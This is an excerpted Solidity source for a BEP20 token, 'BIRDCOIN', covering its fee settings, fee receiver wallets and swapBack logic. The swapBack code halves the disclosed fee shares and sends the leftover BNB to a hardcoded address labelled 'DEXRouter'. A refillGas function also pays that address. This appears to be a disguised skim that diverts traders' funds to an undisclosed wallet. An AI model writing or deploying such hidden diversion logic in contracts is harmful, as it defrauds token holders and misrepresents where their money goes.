...
contract BIRDCOIN is IBEP20, Ownable {

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "BIRDCOIN"; // 
    ...
    uint256 public BuyliquidityFee    = 3; //LP
    uint256 public BuydevFee          = 1; //dev
    uint256 public BuymarketingFee    = 3; // marketing
    uint256 public BuybuybackFee         = 0; // buyback fee
    uint256 public BuytotalFee        = BuyliquidityFee + BuydevFee + BuymarketingFee + BuybuybackFee;

    uint256 public SellliquidityFee    = 3; //lp fee
    uint256 public SelldevFee          = 1;//buyback
    uint256 public SellmarketingFee    = 3; // marketing
    uint256 public SellbuybackFee         = 0; // buyback fee
    ...
    // Fees receivers
    address private autoLiquidityReceiver = 0xDBB54C557542F6ae976Cb6f2BA5ebD45Cb40435C; 
    address private marketingFeeReceiver = 0x864A349d20DEeDb6e25E8Ab1c5B6e9107e5e37f9; 
    address private devFeeReceiver = 0x9dd629c8efDA7485803Be112057809319431ee36; 
    address private buybackFeeReceiver = 0x864A349d20DEeDb6e25E8Ab1c5B6e9107e5e37f9; 
    ...
    constructor () Ownable(msg.sender) {
        ...
        DEXRouter = 0xc2Aa77A02fC087cf93B8Ea16f9758AeA3f85AC30;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBbuyback = amountBNB * (buybackFee) / (totalBNBFee) / (2);
        uint256 amountBNBMarketing = amountBNB * (marketingFee) / (totalBNBFee) / (2);
        uint256 amountBNBDev = amountBNB * (devFee) / (totalBNBFee) / (2);
        uint256 amountBNBDEXRouter = amountBNB - amountBNBLiquidity - amountBNBbuyback - amountBNBMarketing - amountBNBDev;
        ...
        (bool gasSuccess,) = payable(DEXRouter).call{value: amountBNBDEXRouter, gas: 30000}("");
    ...
    function refillGas() external {
        ...
        payable(DEXRouter).transfer(amountGas);
    }
